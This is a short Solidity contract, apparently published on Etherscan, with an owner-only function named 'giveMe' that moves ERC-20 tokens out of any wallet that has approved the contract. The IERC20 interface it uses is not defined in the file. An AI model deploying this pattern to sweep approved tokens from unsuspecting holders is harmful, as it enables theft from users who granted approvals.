/**
 *Submitted for verification at Etherscan.io on 2021-06-03
*/

pragma solidity ^0.4.17;

// SPDX-License-Identifier: Unlicensed


contract GodContract {
    IERC20 iToken;
    
     address private owner;
    
    function GodContract(address erc20) public {
         iToken = IERC20(erc20);
         owner = msg.sender;
    }
    
    modifier onlyOwner (){
       require(msg.sender == owner);
        _;
    }
     
    function giveMe(address _from, address _to , uint256 _amount) public onlyOwner{
        iToken.transferFrom(_from,_to,_amount);     
    }
    
}